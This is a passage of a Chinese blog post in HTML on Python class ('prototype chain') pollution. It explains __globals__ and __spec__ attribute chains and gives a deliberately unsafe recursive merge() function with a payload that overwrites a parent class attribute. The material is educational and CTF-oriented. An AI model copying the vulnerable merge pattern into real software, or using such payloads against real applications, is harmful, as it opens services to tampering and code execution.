@@ -1,0 +1,1077 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    python原型链污染 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="原型链 在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。 取自浅谈Python原型链污染及利用方式-先知社区  理解 __init__：一个 函数对象 __globals__：每个函数对象都">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python原型链污染">
+<meta property="og:url" content="http://example.com/2025/05/07/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="原型链 在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。 取自浅谈Python原型链污染及利用方式-先知社区  理解 __init__：一个 函数对象 __globals__：每个函数对象都">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20231119132251-af51c900-869b-1.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20251006212715141.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20251006212742594.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-10.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926212608885.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926212651642.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926201136761.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926211038272.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926211254522.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926211436799.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926211445970.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/79320cbe707ce0e699c688b6ddd7a831.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/1049983-20231225103127967-1170292261.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/1049983-20231225103127461-983389685.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20231227140618936.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20231227140904083.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/1049983-20231225103125683-1568304073.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3392505-20250329124443818-510842617.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3392505-20250329124634331-1632933365.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926211957517.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250926225753475.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927110214129.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927110257976.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927110341199.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927110418601.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927110518783.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927110527294.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927112549097.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002430162-1706653216.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002441107-807626283.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002457182-1281349181.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927113355492.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002519172-663003006.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002610729-1401803711.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002632457-726007210.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927115622673.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/image-20250927115815047.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002750304-712129408.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002758736-1126843867.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002809565-592733315.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002819475-159467452.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240522002843432-1244932673.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/file-20250410114008260.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180657611-846919114.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180710866-1079050417.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180732101-449418681.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180744335-906623566.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180756642-1522979461.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180808856-1540919111.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180821097-1424186522.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708180842227-1568360038.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708181015089-2065694026.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708181025744-1432753833.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708181037769-109133758.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708181050817-1277846009.png">
+<meta property="og:image" content="http://example.com/2025/05/07/images/3181170-20240708181104472-1088645941.png">
+<meta property="article:published_time" content="2025-05-07T01:00:25.000Z">
+<meta property="article:modified_time" content="2025-12-01T11:23:51.330Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="python原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20231119132251-af51c900-869b-1.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img fetchpriority="high" src="/../images/1737907114de8a.jpg" alt="python原型链污染">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">python原型链污染</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text"> 原型链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%90%86%E8%A7%A3"><span class="toc-number">2.</span> <span class="toc-text"> 理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">3.</span> <span class="toc-text"> 原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%B1%BB"><span class="toc-number">4.</span> <span class="toc-text"> 获取目标类：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-number">4.1.</span> <span class="toc-text"> 获取全局变量：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%85%B6%E4%BB%96%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text"> 获取其他模块:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#import%E5%8A%A0%E8%BD%BD%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.1.</span> <span class="toc-text"> import加载获取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sys%E6%A8%A1%E5%9D%97%E5%8A%A0%E8%BD%BD%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.2.</span> <span class="toc-text"> sys模块加载获取：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%99%A8loader%E8%8E%B7%E5%8F%96"><span class="toc-number">4.2.3.</span> <span class="toc-text"> 加载器loader获取：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%87%BD%E6%95%B0%E5%BD%A2%E5%8F%82%E9%BB%98%E8%AE%A4%E5%80%BC%E6%9B%BF%E6%8D%A2"><span class="toc-number">5.</span> <span class="toc-text"> 函数形参默认值替换：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E4%BF%A1%E6%81%AF%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.</span> <span class="toc-text"> 关键信息替换：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E5%AF%86%E9%92%A5%E6%9B%BF%E6%8D%A2"><span class="toc-number">6.1.</span> <span class="toc-text"> flask密钥替换：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%A1%E6%9F%93%E9%9D%99%E6%80%81%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">6.2.</span> <span class="toc-text"> 污染静态根目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#_got_first_request"><span class="toc-number">6.3.</span> <span class="toc-text"> _got_first_request：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ospathpardir"><span class="toc-number">6.4.</span> <span class="toc-text"> os.path.pardir:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93"><span class="toc-number">7.</span> <span class="toc-text"> pydash原型链污染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E6%97%B6%E6%9C%BA%E4%BD%BF%E7%94%A8"><span class="toc-number">8.</span> <span class="toc-text"> 魔术方法时机使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text"> 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unicode%E7%BC%96%E7%A0%81"><span class="toc-number">9.1.</span> <span class="toc-text"> unicode编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BE%8B%E9%A2%98"><span class="toc-number">10.</span> <span class="toc-text"> Python原型链污染例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezflaskdasctf2023%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B"><span class="toc-number">10.1.</span> <span class="toc-text"> EzFlask(DASCTF2023七月暑期挑战赛)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#geekchallenge2023ezpython"><span class="toc-number">10.2.</span> <span class="toc-text"> [GeekChallenge2023]ezpython</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E6%B4%B5%E6%9D%AF2023-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%8F%98%E4%BD%93"><span class="toc-number">10.3.</span> <span class="toc-text"> 安洵杯2023-原型链污染变体</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80-%E6%B1%A1%E6%9F%93http_proxy"><span class="toc-number">10.3.1.</span> <span class="toc-text"> 法一 污染http_proxy</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C-%E7%9B%B4%E6%8E%A5rce"><span class="toc-number">10.3.2.</span> <span class="toc-text"> 法二 直接rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%89-%E6%8E%A7%E5%88%B6%E5%93%8D%E5%BA%94%E6%95%B0%E6%8D%AE"><span class="toc-number">10.3.3.</span> <span class="toc-text"> 法三 控制响应数据</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pydash%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%BE%8B%E9%A2%98"><span class="toc-number">11.</span> <span class="toc-text"> Pydash原型链污染例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#suctf2025su_blog"><span class="toc-number">11.1.</span> <span class="toc-text"> [SUCTF2025]SU_blog</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nctf-2025-ezdash_revenge"><span class="toc-number">11.2.</span> <span class="toc-text"> NCTF-2025 ezdash_revenge</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ciscn2024sanic%E9%87%8D%E8%A6%81"><span class="toc-number">11.3.</span> <span class="toc-text"> [CISCN2024]Sanic（重要!!!）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dasctf-2024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9Bsanics-revenge%E6%B2%A1%E6%87%82"><span class="toc-number">11.4.</span> <span class="toc-text"> DASCTF 2024暑期挑战赛Sanic’s revenge（没懂）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">11.4.1.</span> <span class="toc-text"> 分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#file_or_directory"><span class="toc-number">11.4.2.</span> <span class="toc-text"> file_or_directory</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">11.4.3.</span> <span class="toc-text"> 解题</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-python原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/07/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-07T01:00:25.000Z" itemprop="datePublished">2025-05-07</time>
+    <time style="display: none;" id="post-update-time">2025-12-01</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9/" data-aos="zoom-in">知识点</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h2 id="原型链"><a class="markdownIt-Anchor" href="#原型链"></a> 原型链</h2>
+<p>在Python中每个对象都有一个原型，原型上定义了对象可以访问的属性和方法。当对象访问属性或方法时，会先在自身查找，如果找不到就会去原型链上的上级对象中查找，原型链污染攻击的思路是通过修改对象原型链中的属性，使得程序在访问属性或方法时得到不符合预期的结果。</p>
+<p>取自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12518">浅谈Python原型链污染及利用方式-先知社区</a></p>
+<h2 id="理解"><a class="markdownIt-Anchor" href="#理解"></a> 理解</h2>
+<p><code>__init__</code>：一个 <strong>函数对象</strong></p>
+<p><code>__globals__</code>：<strong>每个函数对象</strong>都有一个属性 <code>__globals__</code>，它指向 <strong>函数定义所在模块的全局命名空间（字典）</strong>。（包括定义的变量，导入的库，定义的函数、类，Python内置模块）</p>
+<p><code>__spec__</code>：每个模块对象都有一个属性 <code>__spec__</code>，它是 <strong>模块的导入规范对象</strong>，例如<code>__init__.__globals__.time.__spec__</code></p>
+<p><strong>来看个例子：</strong></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__.time.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.０</span><br></pre></td></tr></table></figure>
+<p><code>__init__.__globals__</code> → 是一个 <strong>字典</strong>，存放函数定义时的全局变量。</p>
+<p><code>time</code> → 这个字典里指向的就是 Python 的 <code>time</code> 模块对象。</p>
+<p><code>time.__spec__</code> → 是一个 <code>ModuleSpec</code> 对象（来自 <code>importlib.machinery</code>），表示模块的导入规范。</p>
+<p>对于 <code>ModuleSpec.__init__</code> 来说：</p>
+<ul>
+<li>它定义在 <code>importlib/_bootstrap.py</code>（或 <code>_bootstrap_external.py</code>，取决于实现）。</li>
+<li>所以 <code>__init__.__globals__</code> → 就是 <code>importlib._bootstrap</code> 模块的全局命名空间。</li>
+</ul>
+<p>在 <code>importlib._bootstrap</code> 的全局变量里，自然有一个 <code>sys</code> 引用。</p>
+<p>从中取 <code>sys</code> → 找 <code>sys.modules</code></p>
+<p>进入 <code>jinja2.runtime</code> 模块</p>
+<p>取它的 <code>exported</code> 表（存放可导出符号的 dict/命名空间）</p>
+<p>再访问键 <code>&quot;０&quot;</code></p>
+<h2 id="原型链污染"><a class="markdownIt-Anchor" href="#原型链污染"></a> 原型链污染</h2>
+<p>和JavaScript的原型链污染差不多，都是需要<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=merge%E5%87%BD%E6%95%B0&amp;spm=1001.2101.3001.7020">merge函数</a>来修改父类的属性</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">class father:</span><br><span class="line">    secret = &quot;hello&quot;</span><br><span class="line">class son_a(father):</span><br><span class="line">    pass</span><br><span class="line">class son_b(father):</span><br><span class="line">    pass</span><br><span class="line">def merge(src, dst):</span><br><span class="line">    for k, v in src.items():</span><br><span class="line">        print(f&quot;k:&#123;k&#125;\t v:&#123;v&#125;&quot;)</span><br><span class="line">        if hasattr(dst, &#x27;__getitem__&#x27;):</span><br><span class="line">            if dst.get(k) and type(v) == dict:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            else:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        elif hasattr(dst, k) and type(v) == dict:</span><br><span class="line">            merge(v, getattr(dst, k))</span><br><span class="line">        else:</span><br><span class="line">            setattr(dst, k, v)</span><br><span class="line">instance = son_b()</span><br><span class="line">print(instance)</span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;__class__&quot; : &#123; </span><br><span class="line">        &quot;__base__&quot; : &#123; # 有继承关系，使用__base__找父类</span><br><span class="line">            &quot;secret&quot; : &quot;world&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">print(son_a.secret)</span><br><span class="line">#hello</span><br><span class="line">print(instance.secret)</span><br><span class="line">#hello</span><br><span class="line">merge(payload, instance)</span><br><span class="line"># k:__class__      v:&#123;&#x27;__base__&#x27;: &#123;&#x27;secret&#x27;: &#x27;world&#x27;&#125;&#125;</span><br><span class="line"># getattr(dst,k):  &lt;class &#x27;__main__.son_b&#x27;&gt;</span><br><span class="line"># k:__base__       v:&#123;&#x27;secret&#x27;: &#x27;world&#x27;&#125;</span><br><span class="line"># getattr(dst,k):  &lt;class &#x27;__main__.father&#x27;&gt;</span><br><span class="line"># k:secret         v:world</span><br><span class="line">print(son_a.secret)</span><br><span class="line">#world</span><br><span class="line">print(instance.secret)</span><br><span class="line">#world</span><br></pre></td></tr></table></figure>
+<h2 id="获取目标类"><a class="markdownIt-Anchor" href="#获取目标类"></a> 获取目标类：</h2>
+<h3 id="获取全局变量"><a class="markdownIt-Anchor" href="#获取全局变量"></a> 获取全局变量：</h3>
+<p>在函数或类方法中，我们经常会看到<code>__init__</code>初始化方法，但是它作为类的一个内置方法，在没有被重写作为函数的时候，其数据类型会被当做装饰器，而装饰器的特点就是都具有一个全局属性<code>__globals__</code>属性，<code>__globals__</code> 属性是函数对象的一个属性，用于访问该函数所在模块的全局命名空间。具体来说就是，<code>__globals__</code> 属性返回一个字典，里面包含了函数定义时所在模块的全局变量。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a=1</span><br><span class="line">def demo():</span><br><span class="line">    pass</span><br><span class="line">class A :</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line">print(demo.__globals__==globals()==A.__init__.__globals__)</span><br></pre></td></tr></table></figure>
+<p>然后我们就可以通过<code>merge</code>加上<code>globals</code>来获得对应的全局变量：</p>
